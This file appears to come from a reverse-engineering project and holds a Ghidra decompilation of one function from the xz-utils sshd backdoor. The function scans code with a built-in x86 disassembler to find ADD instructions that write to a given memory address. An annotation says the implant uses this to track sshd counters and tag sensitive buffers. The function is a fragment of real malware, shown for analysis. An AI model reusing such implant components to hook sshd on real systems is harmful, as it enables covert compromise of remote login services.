// /home/kali/xzre-ghidra/xzregh/101170_find_add_instruction_with_mem_operand.c
// Function: find_add_instruction_with_mem_operand @ 0x101170
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_add_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)


/*
 * AutoDoc: Locates ADD instructions that update memory at a given address, capturing the scale of the increment. The scoring logic uses it
 * to observe how sshd mutates counters so the implant can tag sensitive buffers.
 */

#include "xzre_types.h"

BOOL find_add_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  dasm_ctx_t local_80;
  
  pdVar3 = &local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)&pdVar3->instruction = 0;
    pdVar3 = (dasm_ctx_t *)((long)&pdVar3->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &local_80;
  }
  while( TRUE ) {
    if (code_end <= code_start) {
      return FALSE;
    }
    BVar1 = x86_dasm(dctx,code_start,code_end);
    if ((((BVar1 != FALSE) && (*(int *)(dctx->opcode_window + 3) == 0x103)) &&
        (((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000)) &&
       ((mem_address == (void *)0x0 ||
        ((((dctx->prefix).decoded.flags2 & 1) != 0 &&
         ((u8 *)mem_address == dctx->instruction + dctx->instruction_size + dctx->mem_disp))))))
    break;
    code_start = code_start + 1;
  }
  return TRUE;
}

